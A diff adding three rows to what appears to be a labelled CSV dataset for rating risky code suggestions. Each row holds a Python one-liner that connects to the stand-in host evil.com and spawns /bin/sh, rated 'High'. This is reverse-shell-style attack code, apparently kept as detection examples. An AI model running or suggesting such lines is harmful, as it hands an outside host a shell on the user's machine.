@@ -1,1 +1,4 @@
 code_context,label,source
+"import socket, os; s=socket.socket(); s.connect(('evil.com', 8000)); os.system('/bin/sh')",High,verified_suggestion,import socket os s socket socket s connect evil com 8000 os system bin sh
+"import socket, os; s=socket.socket(); s.connect(('evil.com', 8001)); os.system('/bin/sh')",High,verified_suggestion,import socket os s socket socket s connect evil com 8001 os system bin sh
+"import socket, os; s=socket.socket(); s.connect(('evil.com', 8002)); os.system('/bin/sh')",High,verified_suggestion,import socket os s socket socket s connect evil com 8002 os system bin sh
